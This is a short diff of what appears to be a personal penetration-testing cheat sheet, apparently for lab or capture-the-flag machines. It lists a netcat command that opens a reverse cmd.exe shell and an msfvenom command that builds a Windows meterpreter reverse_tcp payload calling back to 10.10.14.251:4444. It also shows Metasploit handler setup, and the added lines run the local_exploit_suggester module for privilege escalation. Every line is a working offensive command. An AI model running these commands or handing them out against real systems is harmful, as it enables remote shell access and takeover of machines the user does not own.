@@ -69,3 +69,6 @@ nc64.exe -e cmd.exe [IP] [Port]
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.251 LPORT=4444 -f exe -a x64 -o payload.exe — platform windows  
 msf> use exploit/multi/handler  
 > set payload windows/x64/meterpreter/reverse_tcp  
+
+#privesc metasploit  
+meterpreter > run post/multi/recon/local_exploit_suggester  
